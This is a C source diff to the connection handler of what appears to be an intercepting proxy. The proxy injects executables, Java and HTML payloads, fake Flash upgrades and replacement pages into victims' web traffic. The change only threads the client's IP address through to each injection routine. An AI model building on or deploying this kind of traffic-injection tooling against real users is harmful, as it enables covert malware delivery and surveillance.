@@ -97,6 +97,7 @@ MY_THREAD_FUNC(handle_connection)
    char *request_end = NULL;
    int len, written;
    char *host, *tag, *th = NULL;
+   char ip[INET_ADDRSTRLEN];
    char *url = NULL;
    char *rsrc = NULL;
    char *p, *q;
@@ -113,7 +114,10 @@ MY_THREAD_FUNC(handle_connection)
    slen = sizeof(peer);
    getpeername(sock, (struct sockaddr *)&peer, &slen);
 
-   DEBUG_MSG(D_INFO, "Handling incoming connection [%d][%s]", sock, inet_ntoa(peer.sin_addr));
+   memcpy(ip, inet_ntoa(peer.sin_addr), strlen(inet_ntoa(peer.sin_addr)));
+   ip[strlen(inet_ntoa(peer.sin_addr))] = '\0';
+
+   DEBUG_MSG(D_INFO, "Handling incoming connection [%d][%s]", sock, ip);
 
    memset(request, 0, sizeof(request));
    written = 0;
@@ -196,7 +200,7 @@ MY_THREAD_FUNC(handle_connection)
          DEBUG_MSG(D_INFO, "Serving local file: [%s]", p);
 
          /* read from the file & close the handle */
-         proxy_replace(&cbio, &sbio, p, req->tag, host);
+         proxy_replace(&cbio, &sbio, p, req->tag, host, ip);
          fclose(fl);
    }
    else if ((req = request_find(tag, url)) != NULL) {
@@ -209,7 +213,7 @@ MY_THREAD_FUNC(handle_connection)
             mangle_request(request, request_end);
 
             /* perform the connection (with injection) */
-            proxy_inject_exe(&cbio, &sbio, request, req->path, host);
+            proxy_inject_exe(&cbio, &sbio, request, req->path, host, ip);
             break;
 
          case REQ_TYPE_INJECT_HTML_JAVA:
@@ -218,7 +222,7 @@ MY_THREAD_FUNC(handle_connection)
             mangle_request(request, request_end);
 
             /* perform the connection (with injection) */
-            proxy_inject_html(&cbio, &sbio, request, req->path, req->tag, host);
+            proxy_inject_html(&cbio, &sbio, request, req->path, req->tag, host, ip);
             break;
 
          case REQ_TYPE_INJECT_HTML_FLASH:
@@ -226,13 +230,13 @@ MY_THREAD_FUNC(handle_connection)
             DEBUG_MSG(D_INFO, "Inject Upgrade attack");
             /* inject the fake reply */
             mangle_request(request, request_end);
-            proxy_fake_upgrade(&cbio, &sbio, request, req->path, req->tag, host);
+            proxy_fake_upgrade(&cbio, &sbio, request, req->path, req->tag, host, ip);
             break;
 
          case REQ_TYPE_REPLACE:
             DEBUG_MSG(D_INFO, "Replace attack");
             /* replace the page with a local one */
-            proxy_replace(&cbio, &sbio, req->path, req->tag, host);
+            proxy_replace(&cbio, &sbio, req->path, req->tag, host, ip);
             break;
       }
 
